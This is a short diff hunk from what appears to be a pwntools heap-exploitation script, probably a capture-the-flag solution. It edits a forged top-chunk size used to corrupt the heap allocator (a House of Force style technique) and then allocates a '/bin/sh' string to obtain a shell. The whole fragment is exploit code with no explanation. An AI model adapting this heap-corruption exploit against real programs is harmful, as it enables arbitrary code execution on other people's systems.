@@ -44,7 +44,7 @@ edit(7, p64(0x6020c8)[:-1], "A"*0x2f)
 free(6)
 free(8)
 
-fake_top = p8(0)*0x27+p64(0xffffffffffffffa1)
+fake_top = p8(0)*0x27+p64(0xffffffffffffffff)
 
 edit(4, p64(0x60213f)[:-1], fake_top)
 malloc(2, "/bin/sh")
